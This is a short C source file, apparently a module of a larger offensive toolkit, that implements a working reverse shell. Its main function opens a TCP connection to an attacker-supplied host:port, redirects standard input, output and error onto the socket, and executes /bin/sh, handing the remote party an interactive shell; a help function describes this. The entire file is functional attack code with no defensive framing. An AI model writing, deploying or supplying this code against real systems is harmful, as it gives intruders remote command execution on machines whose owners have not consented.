#include "actions.h"
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

// https://stackoverflow.com/questions/31567363/c-reverse-shell-issues
int action_reverse_shell(char *remote){
        char *shell[2];
		char *address = strsep(&remote, ":");
		int port = atoi(remote);

        int i,fd;
        struct sockaddr_in sin;

        /* open socket */
        fd = socket(AF_INET, SOCK_STREAM, 0);
        sin.sin_family = AF_INET;
        sin.sin_addr.s_addr = inet_addr(address);
        sin.sin_port = htons(port);

        /* connect! */
        connect(fd, (struct sockaddr *)&sin,sizeof(struct sockaddr_in));

        /* assign three first fd (input/output/err) to open socket */
        for(i=0; i<3; i++)
            dup2(fd, i);

        /* build array */
        shell[0] = "/bin/sh";
        shell[1] = 0;

        /* start the reverse shell */
        if (execve(shell[0], shell, NULL) == -1)
            printf("error\n");
}

void action_reverse_shell_help(){
	fprintf(stderr, "\nReverse shell info:\n");
	fprintf(stderr, "This execs /bin/sh back to the host:port.\n");
}
